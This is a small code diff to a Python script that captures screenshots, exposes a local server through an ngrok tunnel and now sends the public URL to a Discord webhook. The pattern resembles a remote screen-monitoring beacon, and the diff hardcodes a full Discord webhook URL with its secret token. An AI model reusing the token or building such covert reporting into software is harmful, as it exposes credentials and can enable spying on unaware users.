@@ -106,5 +106,6 @@ if __name__ == '__main__':
     screenshot_thread.start()
 
     public_url = ngrok.connect(5000)
-    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1277325619482591334/odNBwGAG9rfzNwPy2G2YDFlHusg_bfdKwhEvwnd79MdXspdGzg1b3wzZ1Bc2U9cmJiiq", content=f"Running on {public_url}")
+    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1277325619482591334/odNBwGAG9rfzNwPy2G2YDFlHusg_bfdKwhEvwnd79MdXspdGzg1b3wzZ1Bc2U9cmJiiq", content=f"Server is live! \n {public_url}")
+    webhook.execute()
     socketio.run(app, debug=False)
